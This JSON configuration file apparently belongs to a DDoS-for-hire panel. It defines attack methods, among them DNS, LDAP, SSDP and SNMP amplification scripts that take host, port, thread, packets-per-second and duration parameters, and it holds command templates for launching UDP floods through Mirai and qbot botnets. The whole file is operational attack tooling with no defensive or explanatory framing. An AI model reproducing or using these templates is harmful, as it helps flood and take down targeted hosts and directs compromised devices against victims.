{
    "HTTP-TLS": {
        "apis": {
            "API1": "tls",
            "API1": "tls"
        },
        "servers": {
        },
        "telnet": {
        },
        "raw": {
        },
        "max_time": 60
    },

    "AMP": {
        "apis": {
            "API1": "LDAP",
            "API2": "UDP",
            "API3": "DNS"
        },
        "servers": {
            "server#1": "./DNS {host} {port} dns.txt {threads} {pps} {time}",
            "server#2": "./LDAP {host} {port} ldap.txt {threads} {pps} {time}",
            "server#3": "./SSDP {host} {port} ssdp.txt {threads} {pps} {time}",
            "server#4": "./SNMP {host} {port} SNMP.txt {threads} {pps} {time}"
        },
        "telnet": {
            "Mirai": ". udp {host} dport={port} {time} 501"
        },
        "raw": {
            "qbot": "!* udp {host} {port} {time}"
        },
        "max_time": 30
    }
}